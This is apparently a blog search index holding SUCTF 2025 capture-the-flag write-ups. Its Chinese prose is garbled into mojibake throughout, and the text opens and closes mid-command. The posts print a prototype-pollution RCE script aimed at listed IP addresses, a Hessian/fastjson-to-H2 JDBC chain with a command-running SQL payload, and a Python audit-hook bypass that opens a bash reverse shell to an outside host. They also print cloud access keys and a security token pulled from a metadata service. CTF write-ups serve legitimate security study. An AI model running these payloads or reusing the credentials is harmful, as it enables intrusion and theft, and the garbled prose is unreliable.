-1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" 1231 456 å‹é“¾åç§°2 å‹é“¾æè¿°2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"å‹é“¾"},{"categories":null,"contents":"ä¸€åå¤§äºŒåœ¨è¯»å­¦ç”Ÿ\nSyclover \u0026amp; 0XFFF æˆå‘˜\nå¯¹å„ç§å®‰å…¨æ„Ÿå…´è¶£ï¼Œç›®å‰ä¸»è¦å­¦ä¹ çš„è¿˜çš„æ˜¯Webå®‰å…¨ï¼ˆJava å®‰å…¨ã€äº‘å®‰å…¨ç­‰ï¼‰\næœ€çˆ±åƒï¼Œæœ€å–œæ¬¢åƒçš„æ˜¯ğŸ‰ï¼Œæœ€å–œæ¬¢å¹²çš„äº‹æƒ…å°±æ˜¯å¤§å¤å¤©æŠ±ç€åŠä¸ªè¥¿ç“œæ‹¿å‹ºå­æŒ–ç€åƒç„¶åçœ‹è§†é¢‘\nä¼šæ‰“ç‚¹å°æ¸¸æˆï¼ˆå…¶å®ä»å°å­¦ä¹‹å‰å°±å¼€å§‹æ‰“æ¸¸æˆäº†hh\nä»€ä¹ˆéƒ½æƒ³å­¦ï¼Œä½†ä»€ä¹ˆéƒ½ä¸ä¼š\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, 